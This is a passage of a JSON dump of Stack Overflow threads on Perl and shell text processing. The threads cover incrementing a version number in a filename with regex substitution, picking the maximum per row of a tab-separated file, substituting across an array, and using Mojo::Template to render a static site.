"registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520866166, "post_id": 49232958, "comment_id": 85479482, "body": "@Borodin: In my question clearly registered this line <code>Note: preceding 0 might be 0..n times.</code>"}, {"owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520866877, "post_id": 49232958, "comment_id": 85479990, "body": "@Borodin: That is not a main point however that is optional preceding zero <code>0..n</code> which I have mentioned in my question and it can be understand clearly that zero is available <code>n</code> times. If zero is not required then why I should I mentioned in the note."}], "answers": [{"comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1520868408, "post_id": 49234601, "comment_id": 85481104, "body": "<code>_v \\K</code> is more efficient than <code>(?&lt;= _v )</code>, though it requires Perl 5.10+"}], "tags": [], "owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "is_accepted": true, "score": 3, "last_activity_date": 1520866985, "last_edit_date": 1520866985, "creation_date": 1520855562, "answer_id": 49234601, "question_id": 49232958, "link": "https://stackoverflow.com/questions/49232958/in-a-string-replacements-how-we-use-r-modifier/49234601#49234601", "title": "In a string replacements how we use &#39;/r&#39; modifier", "body": "<p>I don't think this question has anything to do with the <code>/r</code> modifier, but rather how to properly format the output. For that, I'd suggest <a href=\"http://perldoc.perl.org/functions/sprintf.html\" rel=\"nofollow noreferrer\"><code>sprintf</code></a>:</p>\n\n<pre><code>my $newstr = $str =~ s{ _v (\\d+) \\.zip$ }\n    { sprintf(\"_v%0*d.zip\", length($1), $1+1 ) }xeri;\n</code></pre>\n\n<p>Or, replacing just the number with zero-width <a href=\"http://perldoc.perl.org/perlre.html#Lookaround-Assertions\" rel=\"nofollow noreferrer\">Lookaround Assertions</a>:</p>\n\n<pre><code>my $newstr = $str =~ s{ (?&lt;= _v ) (\\d+) (?= \\.zip$ ) }\n    { sprintf(\"%0*d\", length($1), $1+1 ) }xeri;\n</code></pre>\n\n<p><strong>Note:</strong> With either of these solutions, something like <code>tool_v99.zip</code> would be altered to <code>tool_v100.zip</code> because the new sequence number cannot be expressed in two characters. If that's not what you want then you need to specify what alternative behaviour you require.</p>\n"}, {"comments": [{"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 1, "creation_date": 1520856860, "post_id": 49234646, "comment_id": 85472997, "body": "This doesn&#39;t handle <i>&quot;Note: preceding <code>0</code> might be <code>0..n</code> times.&quot;</i>"}, {"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "reply_to_user": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 0, "creation_date": 1520866293, "post_id": 49234646, "comment_id": 85479559, "body": "@haukex n wasn&#39;t defined in the question so I picked 2...but I&#39;m sure the OP is capable of choosing a number that fits so that all filenames have the same sized number"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520867515, "post_id": 49234646, "comment_id": 85480462, "body": "@Chris: I think you&#39;re misunderstanding the question. <i>&quot;preceding 0 might be 0..n times&quot;</i> is poor English, but it means there may be any number of leading zeroes. It <i>doesn&#39;t</i> mean that <code>n</code> will be provided as part of the data, and you can&#39;t just <i>&quot;pick 2&quot;</i>."}, {"owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520868408, "post_id": 49234646, "comment_id": 85481106, "body": "@Borodin so you don&#39;t think the question is asking how they format a number consistently to fit any numbers within a given range, with potentially optional preceding zeroes?"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520870053, "post_id": 49234646, "comment_id": 85482406, "body": "@Chris: I think the OP has confused themselves. The subject line and the following few lines of code, show attempts to understand the <code>&#47;r</code> modifier and nothing more. That is one question, and is fine as it stands. But then a footnote tries to involve zero-padding, which is completely irrelevant to the main thesis about the <code>&#47;r</code> modifier. Questions here should be focused and complete, but people often carry an expectation that their needs should be serviced first. The truth is that a good question and its answers are the target: together they will help many more than just the OP."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520870227, "post_id": 49234646, "comment_id": 85482541, "body": "@Chris: <i>&quot;so you don&#39;t think the question is asking how they format a number consistently&quot;</i> I must ask what you think it&#39;s about given a subject line <i>&quot;In a string replacements how we use &#39;/r&#39; modifier?&quot;</i> Are you suggesting that no one should be constrained in any way, and a subject line like <i>&quot;$$$s in bitcoin &amp; repair your own uber sys like a pro&quot;</i> should also be fine as long as the question goes on to mention in a <b>note</b> that they have memory errors?"}, {"owner": {"reputation": 2776, "user_id": 137948, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/69ede0d2d1b8ef65b841c031a7bac2e5?s=128&d=identicon&r=PG", "display_name": "Will Sheppard", "link": "https://stackoverflow.com/users/137948/will-sheppard"}, "edited": false, "score": 0, "creation_date": 1535445716, "post_id": 49234646, "comment_id": 91057361, "body": "It seems like the OP is asking two questions at the same time. Is there a precedent for this situation in SO?"}], "tags": [], "owner": {"reputation": 7829, "user_id": 4950584, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-xTMYK-wVa7U/AAAAAAAAAAI/AAAAAAAAAGA/x2vE5BBF-hM/photo.jpg?sz=128", "display_name": "Chris Turner", "link": "https://stackoverflow.com/users/4950584/chris-turner"}, "is_accepted": false, "score": 0, "last_activity_date": 1520855738, "creation_date": 1520855738, "answer_id": 49234646, "question_id": 49232958, "link": "https://stackoverflow.com/questions/49232958/in-a-string-replacements-how-we-use-r-modifier/49234646#49234646", "title": "In a string replacements how we use &#39;/r&#39; modifier", "body": "<p>The bit you're missing is <code>sprintf</code> which works the same way as <code>printf</code> except rather than outputting the formatted string to <code>stdout</code> or a file handle, it returns it as a string. Example:</p>\n\n<pre><code>sprintf(\"%02d\",3)\n</code></pre>\n\n<p>generates a string <code>03</code></p>\n\n<p>Putting this into your regex you can do this. Rather than using <code>/r</code> you can use do a zero-width look ahead (<code>(?=...)</code>) to match the file suffix and just replace the matched number with the new value</p>\n\n<pre><code>s/(\\d+)(?=.zip$)/sprintf(\"%02d\",$1+1)/ei\n</code></pre>\n"}], "owner": {"reputation": 2415, "user_id": 4251338, "user_type": "registered", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/UNbCO.png?s=128&g=1", "display_name": "ssr1012", "link": "https://stackoverflow.com/users/4251338/ssr1012"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 96, "favorite_count": 0, "accepted_answer_id": 49234601, "answer_count": 2, "score": 0, "last_activity_date": 1520866985, "creation_date": 1520850476, "last_edit_date": 1520864760, "question_id": 49232958, "link": "https://stackoverflow.com/questions/49232958/in-a-string-replacements-how-we-use-r-modifier", "title": "In a string replacements how we use &#39;/r&#39; modifier", "body": "<p>I need to increment a numeric value in a string:</p>\n\n<pre><code>my $str = \"tool_v01.zip\";\n\n(my $newstr = $str)  =~ s/\\_v(\\d+)\\.zip$/ ($1++);/eri;\n#(my $newstr = $str) =~ s/\\_v(\\d+)\\.zip$/ ($1+1);/eri;\n#(my $newstr = $str) =~ s/\\_v(\\d+)\\.zip$/ $1=~s{(\\d+)}{$1+1}/r; /eri;\n\nprint $newstr;\n</code></pre>\n\n<p>Expected output is <code>tool_v02.zip</code></p>\n\n<p><strong>Note:</strong> the version number <code>01</code> may contain any number of leading zeroes</p>\n"}, {"tags": ["python", "bash", "perl", "csv"], "answers": [{"tags": [], "owner": {"reputation": 37454, "user_id": 4985733, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/r7daF.jpg?s=128&g=1", "display_name": "Martin Evans", "link": "https://stackoverflow.com/users/4985733/martin-evans"}, "is_accepted": false, "score": 0, "last_activity_date": 1520855063, "last_edit_date": 1520855063, "creation_date": 1520852611, "answer_id": 49233636, "question_id": 49232844, "link": "https://stackoverflow.com/questions/49232844/delete-a-column-from-a-tab-separated-file-based-on-numerical-content-of-column/49233636#49233636", "title": "Delete a column from a tab separated file based on numerical content of column?", "body": "<p>As you've chosen a Python tag, this could be done in Python as follows:</p>\n\n<pre><code>import sys\nimport csv\n\nwith open(sys.argv[1], 'rb') as f_input:\n    tsv = csv.reader(f_input, delimiter='\\t')\n    next(tsv)\n    data = []\n\n    for row in tsv:\n        row = map(int, row)\n        data.append([row[0]] + [max(row[1:])])\n\nwith open(sys.argv[1], 'wb') as f_output:\n    tsv = csv.writer(f_output, delimiter='\\t')\n    tsv.writerow(['Position', 'HighFreq'])\n    tsv.writerows(data)\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1520865495, "post_id": 49234008, "comment_id": 85479034, "body": "It seems obtuse to confine yourself to the ugliness of a one-liner. Unless you are <i>certain</i> that you won&#39;t need this functionality again, you will have to go through the coding process again and again in an very unforgiving environment."}], "tags": [], "owner": {"reputation": 34726, "user_id": 133939, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/pN9C5.png?s=128&g=1", "display_name": "Zaid", "link": "https://stackoverflow.com/users/133939/zaid"}, "is_accepted": false, "score": 3, "last_activity_date": 1520868633, "last_edit_date": 1520868633, "creation_date": 1520853816, "answer_id": 49234008, "question_id": 49232844, "link": "https://stackoverflow.com/questions/49232844/delete-a-column-from-a-tab-separated-file-based-on-numerical-content-of-column/49234008#49234008", "title": "Delete a column from a tab separated file based on numerical content of column?", "body": "<pre><code>$ perl -MList::Util=max -F/\\t/ -lane 'print join \"\\t\", $. == 1 ? qw(Position HighFreq) : ( $F [0], max(@F[1..$#F]) )'\n</code></pre>\n\n<p><strong>Explanation</strong></p>\n\n<ul>\n<li><p><strong><code>-MList::Util=max</code></strong></p>\n\n<p>Load <code>List::Util::max</code></p></li>\n<li><p><strong><code>-F/\\t/ -a</code></strong></p>\n\n<p>Activate auto-split and set delimiter to <code>/\\t/</code></p></li>\n<li><p><strong><code>-lne</code></strong></p>\n\n<p>Automatically append appropriate line ending, apply one-liner, process <code>ARGV</code> input line-by-line</p></li>\n<li><p><strong><code>print join \"\\t\", ...</code></strong></p>\n\n<p>print tab-separated</p></li>\n<li><p><strong><code>$. == 1 ? ... : ...</code></strong></p>\n\n<p>Handle column headings</p></li>\n<li><p><strong><code>max( @F[1..$#F] )</code></strong></p>\n\n<p>returns max of all-but-first elements of <code>@F</code></p></li>\n</ul>\n"}, {"tags": [], "owner": {"reputation": 930, "user_id": 9210255, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/00KKR.png?s=128&g=1", "display_name": "TigerTV.ru", "link": "https://stackoverflow.com/users/9210255/tigertv-ru"}, "is_accepted": true, "score": 0, "last_activity_date": 1520871960, "last_edit_date": 1520871960, "creation_date": 1520854409, "answer_id": 49234209, "question_id": 49232844, "link": "https://stackoverflow.com/questions/49232844/delete-a-column-from-a-tab-separated-file-based-on-numerical-content-of-column/49234209#49234209", "title": "Delete a column from a tab separated file based on numerical content of column?", "body": "<pre><code>awk 'BEGIN{print\"Position\\tHighFreq\"}{if(NR==1)next; max=0;for(i=2;i&lt;=NF; i++) {if($i&gt;max){max=$i;}} printf\"%d\\t%d\\n\",$1,max;}' file.tsv\n</code></pre>\n\n<p>output:</p>\n\n<pre><code>Position    HighFreq\n1   117\n2   16\n3   11\n4   5\n5   15\n6   108\n7   147\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 0, "last_activity_date": 1520865194, "creation_date": 1520865194, "answer_id": 49237797, "question_id": 49232844, "link": "https://stackoverflow.com/questions/49232844/delete-a-column-from-a-tab-separated-file-based-on-numerical-content-of-column/49237797#49237797", "title": "Delete a column from a tab separated file based on numerical content of column?", "body": "<p></p>\n\n<p>In Perl</p>\n\n<pre class=\"lang-perl prettyprint-override\"><code>use strict;\nuse warnings 'all';\nuse feature 'say';\nuse autodie;\n\nuse List::Util 'max';\n\nopen my $fh, '&lt;', 'freq.txt';\n\n&lt;$fh&gt;;\nsay join \"\\t\", qw/ Position HighFreq /;\n\nwhile ( &lt;$fh&gt; ) {\n    my ($n, @fields) = split;\n    say join \"\\t\", $n, max(@fields);\n}\n</code></pre>\n\n<h3>output</h3>\n\n<pre class=\"lang-none prettyprint-override\"><code>Position    HighFreq\n1   117\n2   16\n3   11\n4   5\n5   15\n6   108\n7   147\n</code></pre>\n"}], "owner": {"reputation": 301, "user_id": 5908886, "user_type": "registered", "accept_rate": 100, "profile_image": "https://lh4.googleusercontent.com/-uYdJhbYiFlE/AAAAAAAAAAI/AAAAAAAANT8/Pd71JaSj2zk/photo.jpg?sz=128", "display_name": "SaltedPork", "link": "https://stackoverflow.com/users/5908886/saltedpork"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 379, "favorite_count": 0, "accepted_answer_id": 49234209, "answer_count": 4, "score": 1, "last_activity_date": 1520871960, "creation_date": 1520850085, "last_edit_date": 1520856070, "question_id": 49232844, "link": "https://stackoverflow.com/questions/49232844/delete-a-column-from-a-tab-separated-file-based-on-numerical-content-of-column", "title": "Delete a column from a tab separated file based on numerical content of column?", "body": "<p>I have a tab-separated file, see below:\nThe first column contains the position number, 1-end\nand the rest have some frequency numbers.</p>\n\n<pre><code>Position     A    B    C    D\n1          117    0    1    0   \n2            4    0    0   16   \n3            0    5   11    0   \n4            0    0    0    5   \n5            0   15    0    0   \n6          100    0  108    0   \n7            0    0  147    0  \n</code></pre>\n\n<p>I would like to reformat this file to have two columns, the first is the position column kept as is, and the second contains the highest  frequency for each position.</p>\n\n<p>ideal output:</p>\n\n<pre><code>Position    HighFreq\n1                117\n2                 16  \n3                 11  \n4                  5   \n5                 15   \n6                108  \n7                147 \n</code></pre>\n\n<p>what I have so far is a function that selects the highest number and prints:</p>\n\n<pre><code>awk '{max=$1; for(i=2;i&lt;=NF; i++) {if($i&gt;max){max=$i;}};printf\"%f\\n\",max}' file.tsv\n</code></pre>\n\n<p>I'm trying to write a bash solution for this problem, but Perl/Python is most welcome!</p>\n"}, {"tags": ["arrays", "regex", "perl"], "comments": [{"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 1, "creation_date": 1520849145, "post_id": 49232213, "comment_id": 85468299, "body": "BTW, don&#39;t you want to anchor your regex to the end of the string so that it doesn&#39;t accidentally clobber, for example, the ID? as in <code>s&#47;_20[0-9]{10}$&#47;&#47;</code>"}, {"owner": {"reputation": 280, "user_id": 4301184, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/b25293793923d386acde700a1361f51b?s=128&d=identicon&r=PG&f=1", "display_name": "searcot jabali", "link": "https://stackoverflow.com/users/4301184/searcot-jabali"}, "reply_to_user": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 0, "creation_date": 1520854313, "post_id": 49232213, "comment_id": 85471362, "body": "@haukex. I cant. I neglected to mention in the question but the full format of the file is company_ID_timestamp.ext where ext is the file type extension"}, {"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "edited": false, "score": 1, "creation_date": 1520854919, "post_id": 49232213, "comment_id": 85471730, "body": "Then you could use <a href=\"http://perldoc.perl.org/File/Basename.html\" rel=\"nofollow noreferrer\"><code>File::Basename</code></a> to split up the filename, or modify your regex, e.g. <code>s&#47;_20[0-9]{10}(?=\\.\\w+$)&#47;&#47;</code>"}], "answers": [{"comments": [{"owner": {"reputation": 280, "user_id": 4301184, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/b25293793923d386acde700a1361f51b?s=128&d=identicon&r=PG&f=1", "display_name": "searcot jabali", "link": "https://stackoverflow.com/users/4301184/searcot-jabali"}, "edited": false, "score": 0, "creation_date": 1520854258, "post_id": 49232293, "comment_id": 85471331, "body": "Thanks Haukex I will probably use the last one"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1520865775, "post_id": 49232293, "comment_id": 85479216, "body": "<i>&quot;Unless you want an ugly hack&quot;</i> how will any hack, ugly or otherwise, avoid the necessity of applying the same substitution to every element of an array?"}, {"owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1520869229, "post_id": 49232293, "comment_id": 85481722, "body": "@Borodin Something like this runs the regex over a single string: <code>@todayFiles = split &quot;\\0&quot;, join(&quot;\\0&quot;, @todayFiles) =~ s&#47;_20[0-9]{10}(?=\\.\\w+(\\z|\\0))&#47;&#47;gr;</code> and I guess it&#39;s a matter of opinion whether this fits the OP&#39;s request <i>&quot;without running a loop&quot;</i> \ud83d\ude09"}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1520872712, "post_id": 49232293, "comment_id": 85484124, "body": "@haukex: There is a <code>&#47;g</code> modifier on that substitution, so it still uses iteration. I&#39;m pretty sure that the restriction is arbitrary. We can&#39;t tell exactly why the OP has chosen to eliminate iteration from the toolbox, but I&#39;m guessing that they&#39;ve seen <code>map</code> and want to use it, without realising that it&#39;s a tool of <i>expression</i> rather than implementation."}], "tags": [], "owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "is_accepted": false, "score": 3, "last_activity_date": 1520849477, "last_edit_date": 1520849477, "creation_date": 1520848315, "answer_id": 49232293, "question_id": 49232213, "link": "https://stackoverflow.com/questions/49232213/apply-a-substitution-over-every-element-of-an-array/49232293#49232293", "title": "Apply a substitution over every element of an array", "body": "<p>Unless you want an ugly hack, you're going to want some kind of a loop, even if it's hidden with a <a href=\"http://perldoc.perl.org/functions/map.html\" rel=\"nofollow noreferrer\"><code>map</code></a>, or a <code>for</code> <a href=\"http://perldoc.perl.org/perlsyn.html#Statement-Modifiers\" rel=\"nofollow noreferrer\">statement modifier</a>.</p>\n\n<pre><code>s/_20[0-9]{10}// for @todayFiles;\n</code></pre>\n\n<p>The following works in Perl v5.14 and up (because of the <a href=\"http://perldoc.perl.org/perlop.html#s/_PATTERN_/_REPLACEMENT_/msixpodualngcer\" rel=\"nofollow noreferrer\"><code>/r</code> modifier</a>). This one makes sense if you don't want to modify the original array:</p>\n\n<pre><code>my @otherArray = map { s/_20[0-9]{10}//r } @todayFiles;\n</code></pre>\n\n<p>And here's a shorter/better way to write that C-style loop you showed:</p>\n\n<pre><code>for my $filename (@todayFiles) {\n    $filename =~ s/_20[0-9]{10}//;\n}\n</code></pre>\n\n<p>The latter one works because the <a href=\"http://perldoc.perl.org/perlsyn.html#Foreach-Loops\" rel=\"nofollow noreferrer\"><code>for</code> aka <code>foreach</code></a> loop actually aliases the variable <code>$filename</code> to the elements of the array being iterated over.</p>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 0, "last_activity_date": 1520866094, "creation_date": 1520866094, "answer_id": 49238102, "question_id": 49232213, "link": "https://stackoverflow.com/questions/49232213/apply-a-substitution-over-every-element-of-an-array/49238102#49238102", "title": "Apply a substitution over every element of an array", "body": "<p>To apply a substitution to every element of an array, there is no way but to iterate over those elements</p>\n\n<p>That said, you can tidy up your code a lot by using <code>for</code> as a <em>statement modifier</em> and employing the <code>$_</code> default variable</p>\n\n<pre><code>s/_20[0-9]{10}// for @todayFiles;\n</code></pre>\n\n<p>This still iterates over the entire array, but the code is a lot tighter</p>\n"}], "owner": {"reputation": 280, "user_id": 4301184, "user_type": "registered", "accept_rate": 38, "profile_image": "https://www.gravatar.com/avatar/b25293793923d386acde700a1361f51b?s=128&d=identicon&r=PG&f=1", "display_name": "searcot jabali", "link": "https://stackoverflow.com/users/4301184/searcot-jabali"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 76, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1520866141, "creation_date": 1520848073, "last_edit_date": 1520866141, "question_id": 49232213, "link": "https://stackoverflow.com/questions/49232213/apply-a-substitution-over-every-element-of-an-array", "title": "Apply a substitution over every element of an array", "body": "<p>I have an array of file names. Names are of the format <code>company_ID_timestamp</code>.\nHow do I apply a substitution on the array without running a loop?</p>\n\n<pre><code>for ( my $i=0; $i &lt; scalar @todayFiles; $i++ ) {\n    $todayFiles[$i] = s/_20[0-9]{10}//;\n}\n</code></pre>\n"}, {"tags": ["perl", "mojolicious"], "answers": [{"comments": [{"owner": {"reputation": 3574, "user_id": 676192, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/fcef8c55deae46cc0bfe986b2c189f70?s=128&d=identicon&r=PG", "display_name": "simone", "link": "https://stackoverflow.com/users/676192/simone"}, "edited": false, "score": 0, "creation_date": 1520880088, "post_id": 49237461, "comment_id": 85488313, "body": "Thanks to @amon answer I figured out a somewhat convoluted way to deal with the problem - see my answer below. I obviously acceped hos answer without which I wouldn&#39;t have figured it out."}], "tags": [], "owner": {"reputation": 54872, "user_id": 1521179, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/MH7pk.png?s=128&g=1", "display_name": "amon", "link": "https://stackoverflow.com/users/1521179/amon"}, "is_accepted": true, "score": 3, "last_activity_date": 1520864220, "creation_date": 1520864220, "answer_id": 49237461, "question_id": 49230849, "link": "https://stackoverflow.com/questions/49230849/can-i-use-mojolicious-to-build-a-static-site/49237461#49237461", "title": "Can I use Mojolicious to build a static site?", "body": "<p>You can use Mojo templates outside of the Mojolicious web framework \u2013 I used to do that to render static pages for my blog. However, the <code>Mojo::Template</code> does not come with the normal helpers by default. Instead, the rest of Mojolicous injects variables and helpers into the template.</p>\n\n<p>For my blog, I decided to implement my own helper system. I'll describe my solution in the rest of this answer. Mojo may have changed in the meantime, and may prefer some different solution.</p>\n\n<p>I modelled a template as a pair of a <em>stash</em> reference and the Mojo::Template object. Each Template is compiled into its own package. Later, we can inject temporary values into the stash reference and communicate values to the outside. A helper is a closure of a specific stash ref, so it can access these values without using an explicit parameter.</p>\n\n<p>Here's how templates are compiled:</p>\n\n<pre><code>package AMON::Blog::TemplateCollection;\n\nsub add_template($self, $name, $source) {\n    state $namespace_id = 0;\n    my $namespace = Package::Stash-&gt;new(\n        __PACKAGE__ . '::Namespace::' . ++$namespace_id);\n\n    my $template = Mojo::Template-&gt;new(\n        name =&gt; $name,\n        namespace =&gt; $namespace-&gt;name,\n        auto_escape =&gt; 1,\n        tag_start =&gt; '{{',\n        tag_end =&gt; '}}',\n    );\n\n    # enter the helpers into the namespace\n    my $stash_ref = \\{};\n    while (my ($name, $code) = each %{ $self-&gt;helpers }) {\n        $namespace-&gt;add_symbol('&amp;' . $name =&gt; $code-&gt;($stash_ref));\n    }\n\n    $template-&gt;parse($source);\n\n    $self-&gt;templates-&gt;{$name} = {\n        stash_ref =&gt; $stash_ref,\n        template =&gt; $template\n    };\n\n    return;\n}\n</code></pre>\n\n<p>Here is a <code>layout</code> helper that writes the requested layout into a stash variable:</p>\n\n<pre><code>layout =&gt; sub ($stash_ref) {\n    return sub ($name, %args) {\n        if (my $existing = $$stash_ref-&gt;{layout}) {\n            croak sprintf q(Can't change layout from \"%s\" to \"%s\"), $existing-&gt;{name}, $name;\n        }\n        $$stash_ref-&gt;{layout} = { name =&gt; $name, args =&gt; \\%args };\n    };\n},\n</code></pre>\n\n<p>The outer sub is only used to close over the <code>$stash_ref</code>, and is executed during template compilation above.</p>\n\n<p>To render the template, we supply temporary stash values, then process the Mojo::Template. If the stash contains a layout argument, we recurse to render the layout template with the current template's output as content:</p>\n\n<pre><code>sub render($self, $name, %args) {\n    my $template = $self-&gt;templates-&gt;{$name}\n        // croak qq(Unknown template \"$name\");\n\n    my ($stash_ref, $template_object) = @$template{qw/stash_ref template/};\n\n    $$stash_ref = {\n        name =&gt; $name,\n        layout =&gt; undef,\n        args =&gt; \\%args,\n    };\n\n    my $result = $template_object-&gt;process();\n\n    my $layout_args = $$stash_ref-&gt;{layout};\n    $$stash_ref = undef;\n\n    if (blessed $result and $result-&gt;isa('Mojo::Exception')) {\n        die $result;\n    }\n\n    if ($layout_args) {\n        my $name = $layout_args-&gt;{name};\n        my $args = $layout_args-&gt;{args};\n        return $self-&gt;render($name, %$args, content =&gt; $result);\n    